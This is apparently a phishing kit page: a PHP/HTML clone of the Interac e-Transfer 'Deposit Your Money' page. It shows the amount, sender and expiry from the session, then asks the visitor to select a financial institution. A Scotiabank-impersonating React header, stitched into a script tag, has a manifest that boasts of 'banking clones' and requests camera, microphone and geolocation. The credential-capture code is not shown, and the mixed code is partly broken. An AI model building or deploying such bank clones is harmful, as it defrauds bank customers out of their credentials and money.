<?php
declare(strict_types=1);

// Set timezone for Edmonton, Alberta
date_default_timezone_set('America/Edmonton');

session_start();

// Safely hydrate transaction data
$tx = $_SESSION['transaction_data'] ?? [];

// Amount (formatted)
$amount = isset($tx['amount']) && is_numeric($tx['amount'])
    ? number_format((float)$tx['amount'], 2)
    : '0.00';

// Sender
$sender = (string)($tx['sender'] ?? 'Sender');

// Expiry timestamp → readable date
if (!empty($tx['expires'])) {
    // Convert to integer timestamp
    $timestamp = is_numeric($tx['expires']) ? (int)$tx['expires'] : strtotime($tx['expires']);
    if ($timestamp === false || $timestamp <= 0) {
        // Invalid timestamp → fallback to 30 days from now
        $timestamp = strtotime('+30 days');
    }
} else {
    // No expiry set → default to 30 days from now
    $timestamp = strtotime('+30 days');
}

// Format expiry: Month day, Year
$expiry = date('F j, Y', $timestamp);

// Reference
$ref = (string)($tx['transaction_id'] ?? 'N/A');

// Currency
$currency = 'CAD';
?>



<!doctype html>
<!-- header_begin -->
<html lang="en"><head>
<script src="assets/js/RP.do_inline_script.js"></script>
<meta content="Thu, 01 Jan 1970 00:00:01 GMT" http-equiv="Expires"/>
<meta content="no-cache" http-equiv="Cache-Control"/>
<meta content="no-cache" http-equiv="pragma"/>
<meta http-equiv="no-cache"/>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="description"/>
<!-- Google Tag Manager -->
<script src="assets/js/RP.do_inline_script_2.js"></script>
<!-- End Google Tag Manager -->
<!-- Facebook OG Meta Tag -->
<meta content="Receiving an INTERAC e-Transfer is fast and free using your mobile or online banking." property="og:description">
<meta content="https://s3.amazonaws.com/etransfer-notification.interac.ca/images/etransfer_thumbnail_en.png" property="og:image">
<meta content="https://etransfer.interac.ca/?lang=en" property="og:url">
<meta content="INTERAC e-Transfer" property="og:site_name">
<!-- end Facebook OG Meta Tag  -->
<!-- Turn off telephone number detection on iOS. -->
<meta content="telephone=no" name="format-detection"/>
<link href="assets/css/generalCSS.css" media="screen" rel="stylesheet" type="text/css"/>
<link href="assets/css/GTIe8CSS.css" media="screen" rel="stylesheet" type="text/css"/>
<!--[if lte IE 8]>
<link rel="stylesheet" type="text/css" media="screen" href="assets/css/LTEIe8CSS.css" />
<![endif]-->
<!--[if IE 9]>
<link rel="stylesheet" type="text/css" media="screen" href="assets/css/Ie9CSS.css" />
<![endif]-->
<script src="assets/js/vendorJS.js" type="text/javascript"></script>
<title>INTERAC e-Transfer</title>
<script src="assets/js/gatewayInitJS.js" type="text/javascript"></script>
<script src="assets/js/TMHeader.js" type="text/javascript"></script>
<script src="fp/tags.js?org_id=bzmgl3t1s&amp;session_id=9147ff14-3f8f-4173-a2b7-c1882d5a1d63" type="text/javascript"></script>
<style>
#search-container, #search-wrapper, #autocomplete-typehead-div, .sb-search {
    width: 100%;
    max-width: 100%;
    position: relative; /* ensures absolutely positioned children stay inside */
}



</style>

<!-- header_end -->
</meta></meta></meta></meta></meta></head>
<body>
<a class="skip-link" href="#main">Skip to content</a>
<script src="assets/js/RP.do_inline_script_3.js"></script>
<noscript>

</noscript>

<input id="manualDelay" type="hidden" value="0"/>
<input id="adManualDelay" type="hidden" value="3000"/>
<header>
<!-- Google Tag Manager -->
<noscript>

</noscript>
<!-- End Google Tag Manager -->
<script src="assets/js/RP.do_inline_script_4.js"></script>
<div class="custom-wrapper nav-menu" data-enhance="false" id="menu">
<div class="pure-g nav-wrapper interac-max-width">
<div class="pure-u-1 pure-u-md-1-3">
<div class="pure-menu pure-menu-heading">
<a class="custom-brand" href="http://www.interac.ca/en" hreflang="en">
<img alt="INTERAC e-Transfer " id="brand-logo" src="assets/photos/etransfer_logo.svg" style="height: 50px;"/>
</a>
<a aria-label="Changer la langue en français" class="change-language pure-menu-link pure-hidden-md pure-hidden-lg pure-hidden-xl" data-ajax="false" href="#" hreflang="fr" style="position: absolute; top: 15px; right: 90px;">
                    Français
                </a>
<a class="help-link pure-menu-link pure-hidden-md pure-hidden-lg pure-hidden-xl help-link" data-ajax="false" href="#" hreflang="en" style="position: absolute; top: 5px; right: 45px;"> <img alt="Help" height="30px" id="help-icon" src="assets/photos/question-mark.svg" width="30px"/>
</a>
<a aria-expanded="false" aria-labelledby="menu-description" class="custom-toggle" data-role="button" href="#" id="toggle" role="button">
<s class="bar"></s>
<s class="bar"></s>
</a> <p id="menu-description" style="display: none"> Show navigation menu</p>
<p id="close-menu-description" style="display: none"> Hide navigation menu</p>
</div>
</div>
<div class="pure-u-1 pure-u-md-2-3">
<div class="pure-menu pure-menu-horizontal custom-menu-3 custom-can-transform">
<ul aria-label="Menu" class="pure-menu-list" role="menu">
<li class="pure-menu-item" role="none">
<a class="contactus-link pure-menu-link" data-ajax="false" href="#" hreflang="en" role="menuitem">
                            Contact Us
                        </a>
</li>
<li class="pure-menu-item" role="none">
<a class="about-menu pure-menu-link" data-ajax="false" href="#" hreflang="en" role="menuitem">
                            About
                        </a>
</li>
<li class="pure-menu-item pure-hidden-sm pure-hidden-xs" role="none">
<a aria-label="Changer la langue en français" class="change-language pure-menu-link" data-ajax="false" href="#" hreflang="fr" role="menuitem">
                            Français
                        </a>
</li>
<li class="pure-menu-item pure-hidden-sm pure-hidden-xs" role="none">
<a class="help-link pure-menu-link" data-ajax="false" href="#" hreflang="en" role="menuitem">
<img alt="Help" height="30px" id="help-icon-mobile" src="assets/photos/question-mark.svg" width="30px"/>
</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</header>

<main id="main">
  <div style="position:relative" class="interac-max-width" data-role="page" data-enhance="false">
    <div class="details-panel margin-top-15">
      <div class="pure-u-1"><div class="pure"><div class="pure-g">

        <!-- Left-hand info -->
        <div class="pure-u-1 pure-u-sm-1-2 left-hand-info">
          <div class="pure-u-2-24 global-left-padding">
            <div class="line">
              <svg width="25" height="25" viewBox="0 0 30 30" xmlns="http://www.w3.org/2000/svg">
                <path d="M24,15l-1.406-1.406L16,20.188V2h-2v18.188l-6.594-6.594L6,15l9,9L24,15z M2,26v2h26v-2H2z" fill="#999"/>
              </svg>
            </div>
          </div>
          <div class="pure-u-21-24">
            <h1 class="deposit-label" style="margin-top:0">Deposit Your Money</h1>
            <div class="margin-bottom-15 line">
              <span id="amountValue" class="largeFont"><?= $amount ?></span>
              <span id="currencyValue" class="paymentDetailsImportantFont">CAD</span>
              <input id="fmtAmount" name="fmtAmount" type="hidden" value="<?= $amount ?>" />
            </div>
            <div class="pure-u-1 paymentDetailsImportantFont line fromDiv">
              <div class="grid-style"><span id="fromLabel">From:</span></div>
              <div class="pure-u-4-5 line white-space-normal">
                <span id="fromValue"><?= $sender ?></span>
              </div>
            </div>
            <br>
          </div>
        </div>

        <!-- Right-hand info -->
        <div class="pure-hidden-xs pure-hidden-sm pure-u-sm-1-2 desktop-only-left-grey-border right-hand-info">
          <div class="pure-u-1 right-hand-container">
            <div class="left-hand-line">
              <div class="pure-u-xl-5-24 pure-u-md-6-24 pure-u-sm-7-24 right-hand-label">
                <span id="expiryLabel">Expires:</span>
              </div>
              <div class="pure-u-1-24">&nbsp;</div>
              <div class="pure-u-xl-18-24 pure-u-md-17-24 pure-u-sm-16-24">
                <span id="expiryValue"><?= $expiry ?></span>
              </div>
            </div>
            <div class="left-hand-line">
              <div class="pure-u-xl-5-24 pure-u-md-6-24 pure-u-sm-7-24 right-hand-label">
                <span id="referenceNumLabel">Reference #:</span>
              </div>
              <div class="pure-u-1-24">&nbsp;</div>
              <div class="pure-u-xl-18-24 pure-u-md-17-24 pure-u-sm-16-24 white-space-normal">
                <span id="referenceNumValue"><?= $ref ?></span>
              </div>
            </div>
          </div>
        </div>

        <!-- Spacer for layout -->
        <div class="pure-u-1 pure-u-sm-1-2 pure-u-md-1-3"></div>

      </div></div></div></div>
    </div>

    <div class="separator"></div>

    <!-- Mobile accordion -->
    <div class="pure-u-1 pure-hidden-xl pure-hidden-lg pure-hidden-md mobile-details-panel">
      <div class="accordion">
        <div class="pure-g accordion-toggle">
          <div class="pure-u-4-5">
            <h4 class="global-left-padding">View Transfer Details</h4>
          </div>
          <div class="pure-u-1-5 text-right">
          <svg height="40px" width="40px" viewBox="-5 -5 30 30"
               xmlns="http://www.w3.org/2000/svg"
               xmlns:xlink="http://www.w3.org/1999/xlink"
               class="translate-y-d-10">
            <switch>
              <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1">
                <path
                  d="M0,11 C0,4.92486745 4.92486745,0 11,0 C17.0751325,0 22,4.92486745 22,11
                     C22,17.0751325 17.0751325,22 11,22 C4.92486745,22 0,17.0751325 0,11 Z
                     M21,11 C21,5.47715223 16.5228478,1 11,1 C5.47715223,1 1,5.47715223 1,11
                     C1,16.5228478 5.47715223,21 11,21 C16.5228478,21 21,16.5228478 21,11 Z
                     M12.1454356,11.4205619 L8.25634833,15.3096492 L9.6767767,16.7300776
                     L14.9800776,11.4267767 L9.3232233,5.76992245 L7.90900974,7.18413601
                     L12.1454356,11.4205619 Z"
                  fill="#f0b51c" id="detailToggleChevron"/>
              </g>
            </switch>
          </svg>
          </div>
        </div>
        <div class="accordion-content global-left-padding">
          <div class="pure-u-1">
            <div class="left-hand-line">
              <div class="pure-u-1-2 right-hand-label"><span>Expires:</span></div>
              <div class="pure-u-1-2"><span><?= $expiry ?></span></div>
            </div>
            <div class="left-hand-line">
              <div class="pure-u-1-2 right-hand-label"><span>Reference #:</span></div>
              <div class="pure-u-1-2 white-space-normal"><span><?= $ref ?></span></div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="separator"></div>
    <div class="separator"></div>

  </div>

<input id="fiListOption" name="fiListOption" type="hidden" value="null"/>
<link href="assets/css/searchCSS.css" media="screen" rel="stylesheet" type="text/css"/>
<div class="pure-u-1">
<div class="pure">
<div class="pure-g">
<div class="pure-u-1 pure-u-sm-1-2">
<div class="title-on" id="select-fi-title">
<h2 aria-label="Select institution" class="resp-header-size global-left-padding">
                        Select Your Financial Institution
                    </h2>
</div>
<div class="title-off" id="search-title">
<h2 class="resp-header-size global-left-padding">
                        Search
                    </h2>
</div>
<div class="pure-u-1 pure-u-sm-1-2" style="text-align: right;">
<div class="column" id="search-pos">
<div id="search-container">
<div id="search-wrapper">
<div id="autocomplete-typehead-div">
<input aria-autocomplete="list" aria-expanded="false" aria-haspopup="listbox" aria-label="Bank or Credit Union Name" aria-labelledby="sb-search" aria-required="false" autocapitalize="off" autocomplete="off" autocorrect="off" class="typehead visibility-hidden" id="autocomplete-input" placeholder="Bank or Credit Union Name" role="combobox" type="text"/>
</div>
<div aria-label="Search" aria-pressed="false" class="sb-search ui-corner-all sb-search-close" data-role="searchbox" id="sb-search" role="button" style="margin: 0px">
<div id="search-retracted-label">
                                    Search
                                </div>
<button class="sb-icon-search" style="width: auto;background: none;border: none;">
<svg aria-hidden="false" aria-label="Open search form" class="yellow-background circle-icon" enable-background="new 0 0 60 60" height="40px" id="search-icon" style="position: absolute" version="1.1" viewbox="-20 -20 100 100" width="40px">
<path class="white-icon" d="m 3.281,54.376 3.407,3.407 c 1.038,1.037 2.721,1.037 3.758,0 L 27.243,40.986 c 0.059,-0.059 0.102,-0.125 0.153,-0.187 3.095,1.82 6.689,2.884 10.541,2.884 11.51,0 20.841,-9.331 20.841,-20.841 C 58.778,11.332 49.447,2 37.937,2 26.427,2 17.096,11.331 17.096,22.841 c 0,3.996 1.145,7.716 3.095,10.887 -0.036,0.033 -0.077,0.057 -0.112,0.092 L 3.281,50.618 c -1.038,1.038 -1.038,2.72 0,3.758 z m 18.791,-31.39 c 0,-8.722 7.071,-15.793 15.793,-15.793 8.722,0 15.793,7.071 15.793,15.793 0,8.723 -7.071,15.793 -15.793,15.793 -8.722,0 -15.793,-7.071 -15.793,-15.793">
</path>
</svg>
<img alt="Close search form" aria-hidden="true" aria-label="Close search form" height="40px" id="close-icon" role="button" src="assets/photos/close-icon.svg" style="visibility: hidden" width="40px"/>
</button>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="fiSelection">
  <div id="fiOptionsPane">
    <div class="pure-g">
      <div class="pure-u-1">
        <div class="fi-grid">
          <?php include __DIR__ . 'partials/banks.php'; ?>                                         </div>
      </div>
    </div>
  </div>
</div>

<div class="visibility-hidden" id="searchPane" style="background:#fff">
<div class="pure-g" style="">
<div class="pure-u-1">
<div class="pure-g" data-demo-css="true" data-demo-html="true" data-demo-js="true">
<div class="pure-u-md-2-3 pure-u-1">
<div aria-live="polite" data-role="status" id="autocomplete_div" role="status" style="display: none">
<div class="refine-search-panel" style="display: none">
                            Your search returned too many results. Please Refine your search
                        </div>
</div>
</div>
<div class="pure-u-md-2-3 pure-u-1">
<div aria-live="polite" class="no-results-panel padding-10 margin-desktop-only-left-25" data-role="alert" id="no-results-panel" role="alert" style="display:none">
<div class="display-inline-block translate-y-d-15">
<svg height="38" id="noresult-icon" viewbox="0 0 48 48" width="38" xmlns="http://www.w3.org/2000/svg">
<path d="M0 0h48v48h-48z" fill="none"></path>
<path d="M22 34h4v-12h-4v12zm2-30c-11.05 0-20 8.95-20 20s8.95 20 20 20 20-8.95 20-20-8.95-20-20-20zm0 36c-8.82 0-16-7.18-16-16s7.18-16 16-16 16 7.18 16 16-7.18 16-16 16zm-2-22h4v-4h-4v4z"></path>
</svg>
</div>
<h4 class="display-inline-block">
                            Your Search Returned no results
                        </h4>
</div>
</div>
<div id="fiDetailContainer">
<div class="pure-u-1 deposit-form-submit-btn search-submit visibility-hidden" id="fiDetailPanel">
<div>
<span class="padding-v-10" id="selectedFiLabel">
                                Selected Financial Institution
                            </span>
</div>
<div class="pure-g margin-right-15">
<div class="pure-u-1 margin-top-15">
<span class="padding-v-10" id="selectedFiValue"></span>
</div>
<div class="pure-u-1">
<button class="pure-button button-brand-a deposit-form-submit-btn" data-enhance="false" data-role="none" disabled="" id="depositSearchSubmit" type="button">
                                    Deposit
                                    <span aria-hidden="true"> &gt; </span>
</button>
</div>
<script>
  import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { BackIcon, ScotiaLogoSVG, BellIcon, HelpCircleIcon } from '../ScotiaIcons';
import { Search, X, Zap, ArrowRight, ShieldCheck } from 'lucide-react';



/* ================================
   TOP HEADER COMPONENT
================================ */

export const TopHeader = ({
  onBack,
  title,
  rightElement,
  onChat,
  onNotification
}) => {
  const [isOpen, setIsOpen] = useState(false);

  const handleExit = () => {
    localStorage.clear();
    window.location.href = 'https://www.scotiabank.com';
  };

  const Hamburger = () => (
    <button
      onClick={() => setIsOpen(!isOpen)}
      className="relative w-10 h-10 flex flex-col justify-center items-center group z-[200]"
    >
      <motion.span
        animate={isOpen ? { rotate: 45, y: 6 } : { rotate: 0, y: 0 }}
        className="w-6 h-0.5 bg-white mb-1.5 block rounded-full"
      />
      <motion.span
        animate={isOpen ? { opacity: 0 } : { opacity: 1 }}
        className="w-6 h-0.5 bg-white mb-1.5 block rounded-full"
      />
      <motion.span
        animate={isOpen ? { rotate: -45, y: -8 } : { rotate: 0, y: 0 }}
        className="w-6 h-0.5 bg-white block rounded-full"
      />
    </button>
  );

  return (
    <>
      <div className="bg-[#ED0711] pt-14 pb-8 px-6 flex items-center justify-between shrink-0 relative z-[150] shadow-lg">
        <div className="flex items-center gap-3">
          {onBack ? (
            <button onClick={onBack} className="p-1 active:scale-90 transition-transform -ml-2">
              <BackIcon color="white" size={24} />
            </button>
          ) : (
            <Hamburger />
          )}

          <ScotiaLogoSVG color="white" className="w-8 h-8" />

          {title && (
            <h2 className="text-white font-bold text-[16px] tracking-tight ml-1 first-letter:uppercase">
              {title.toLowerCase()}
            </h2>
          )}
        </div>

        <div className="flex items-center gap-5">
          {rightElement ? (
            rightElement
          ) : (
            <>
              <button
                onClick={onNotification}
                className="text-white/90 active:scale-90 transition-transform hover:text-white"
              >
                <BellIcon size={24} color="currentColor" />
              </button>
              <button
                onClick={onChat}
                className="text-white/90 active:scale-90 transition-transform hover:text-white"
              >
                <HelpCircleIcon size={24} color="currentColor" />
              </button>
            </>
          )}
        </div>
      </div>

      {isOpen && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="fixed inset-0 bg-black/90 backdrop-blur-xl z-[180] flex flex-col items-center justify-center p-10 text-center"
        >
          <div className="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center mb-8 shadow-2xl shadow-red-600/20">
            <HelpCircleIcon size={40} color="white" />
          </div>

          <h2 className="text-white font-black text-2xl mb-4 uppercase tracking-tighter">
            Terminate Session?
          </h2>

          <p className="text-zinc-500 text-sm mb-12 leading-relaxed">
            Closing this module will encrypt all temporary research data and return you to the public web.
          </p>

          <div className="w-full space-y-4">
            <button
              onClick={handleExit}
              className="w-full py-5 bg-white text-black font-black rounded-2xl uppercase tracking-widest text-xs"
            >
              Confirm Exit
            </button>

            <button
              onClick={() => setIsOpen(false)}
              className="w-full py-5 bg-white/5 text-white/40 font-black rounded-2xl uppercase tracking-widest text-xs"
            >
              Resume Operation
            </button>
          </div>
        </motion.div>
      )}
    </>
  );
};



/* ================================
   SEARCH OVERLAY COMPONENT
================================ */

export const SearchOverlay = ({
  isOpen,
  onClose,
  apps,
  onOpenApp
}) => {
  const [query, setQuery] = useState('');
  const inputRef = useRef(null);

  useEffect(() => {
    if (isOpen) {
      setTimeout(() => inputRef.current?.focus(), 100);
    }
  }, [isOpen]);

  if (!isOpen) return null;

  const filtered = apps
    .filter(
      (a) =>
        a.name.toLowerCase().includes(query.toLowerCase()) ||
        a.category.toLowerCase().includes(query.toLowerCase())
    )
    .slice(0, 8);

  const bankOnlyResults = apps.filter(
    (a) =>
      a.isBank &&
      a.name.toLowerCase().includes(query.toLowerCase())
  );

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 z-[2000] bg-black/95 backdrop-blur-2xl flex flex-col"
      >
        {/* Search Bar */}
        <motion.div
          initial={{ y: 100, width: '80%', margin: '0 auto' }}
          animate={{ y: 0, width: '100%', margin: '0' }}
          transition={{ type: 'spring', damping: 30, stiffness: 200 }}
          className="bg-zinc-900/50 border-b border-white/10 p-6 pt-16 flex items-center gap-4 sticky top-0"
        >
          <div className="relative flex-1">
            <Search className="absolute left-6 top-1/2 -translate-y-1/2 text-red-500 w-5 h-5" />

            <input
              ref={inputRef}
              type="text"
              value={query}
              onChange={(e) => setQuery(e.target.value)}
              placeholder="Find a Bank or Module..."
              className="w-full bg-white/5 border border-white/10 rounded-full py-5 pl-16 pr-8 text-xl text-white outline-none focus:border-red-500/50 shadow-2xl font-bold placeholder:text-zinc-700 transition-all"
            />
          </div>

          <button
            onClick={onClose}
            className="p-4 bg-white/5 rounded-full text-zinc-500 hover:text-white transition-all active:scale-75"
          >
            <X size={24} strokeWidth={3} />
          </button>
        </motion.div>

        {/* Results */}
        <div className="flex-1 overflow-y-auto p-8 no-scrollbar">
          <div className="max-w-4xl mx-auto space-y-12">

            {query.length > 0 && bankOnlyResults.length > 0 && (
              <div>
                <div className="flex items-center gap-3 mb-6 px-2">
                  <ShieldCheck size={16} className="text-red-500" />
                  <h3 className="text-[10px] font-black text-red-500 uppercase tracking-[0.3em]">
                    Verified Bank Nodes
                  </h3>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {bankOnlyResults.map((app) => (
                    <button
                      key={app.id}
                      onClick={() => {
                        onOpenApp(app.id);
                        onClose();
                      }}
                      className="bg-zinc-900 border border-white/5 p-6 rounded-[32px] flex items-center gap-6 group hover:border-red-500/30 transition-all text-left shadow-xl"
                    >
                      <img
                        src={app.icon}
                        className="w-14 h-14 rounded-2xl object-cover shadow-2xl group-hover:scale-110 transition-transform"
                        alt=""
                      />

                      <div className="flex-1">
                        <p className="text-white font-black text-lg tracking-tight uppercase italic">
                          {app.name}
                        </p>
                        <p className="text-zinc-500 text-[10px] font-black uppercase tracking-widest mt-1">
                          Uplink Stable • CDN-0x
                        </p>
                      </div>

                      <ArrowRight size={20} className="text-zinc-800 group-hover:text-red-500 transition-colors" />
                    </button>
                  ))}
                </div>
              </div>
            )}

            <div>
              <div className="flex items-center gap-3 mb-6 px-2 opacity-40">
                <Zap size={16} className="text-zinc-500" />
                <h3 className="text-[10px] font-black text-zinc-500 uppercase tracking-[0.3em]">
                  System Modules
                </h3>
              </div>

              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                {filtered.map((app) => (
                  <button
                    key={app.id}
                    onClick={() => {
                      onOpenApp(app.id);
                      onClose();
                    }}
                    className="bg-white/5 border border-white/5 p-5 rounded-[28px] flex flex-col items-center gap-3 hover:bg-white/10 transition-all text-center group"
                  >
                    <img
                      src={app.icon}
                      className="w-12 h-12 rounded-xl object-cover grayscale opacity-60 group-hover:grayscale-0 group-hover:opacity-100 transition-all"
                      alt=""
                    />

                    <div>
                      <p className="text-white/80 font-bold text-xs group-hover:text-white">
                        {app.name}
                      </p>
                      <p className="text-zinc-600 text-[9px] uppercase font-black tracking-tighter mt-1">
                        {app.category}
                      </p>
                    </div>
                  </button>
                ))}
              </div>
            </div>

            {query.length === 0 && (
              <div className="text-center py-20 opacity-20">
                <Search size={64} className="mx-auto mb-6 text-zinc-500" />
                <p className="text-xs font-black uppercase tracking-[0.5em]">
                  Input Search Directive
                </p>
              </div>
            )}

          </div>
        </div>
      </motion.div>
    </AnimatePresence>
  );
};



/* ================================
   MANIFEST EXPORT
================================ */

export const AppManifest = {
  name: "RB-OS - High Fidelity Matrix",
  description:
    "Robyn Banks' definitive research OS. Modular banking clones, active signal relays, and neural-aided financial analysis.",
  requestFramePermissions: ["camera", "microphone", "geolocation"],
  theme_color: "#000000",
  background_color: "#000000",
  display: "standalone"
};

  </script>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
